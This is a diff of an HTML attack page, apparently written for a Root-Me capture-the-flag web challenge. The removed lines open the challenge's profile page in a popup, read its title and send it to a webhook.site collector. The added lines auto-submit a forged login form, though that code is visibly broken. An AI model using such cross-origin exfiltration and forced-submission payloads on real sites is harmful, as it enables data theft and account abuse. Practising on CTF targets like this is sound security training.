@@ -4,17 +4,8 @@
 </head>
 <body>
 <script>
-var popup = window.open("http://challenge01.root-me.org:58003/profile", "popupWindow");
-
-setTimeout(() => {
-  try {
-    var title = popup.document.title;
-    window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?title=" + btoa(title);
-  } catch (e) {
-    console.error("Impossible d’accéder au document de la popup (cross-origin)", e);
-    window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?error=cross_origin";
-  }
-}, 8000);
+document.write('<form method="POST" action="http://challenge01.root-me.org:58003/login"><input id="username" class="mgb-1" name="username" value="'+atob()+'"></input><input id="secret" class="mgb-1" name="secret" value="bbbb"></input><button class="mgb-1" id="clickbtn" type="submit">Login</button></form>');
+document.getElementById("clickbtn").submit();
 </script>
 </body>
 </html>
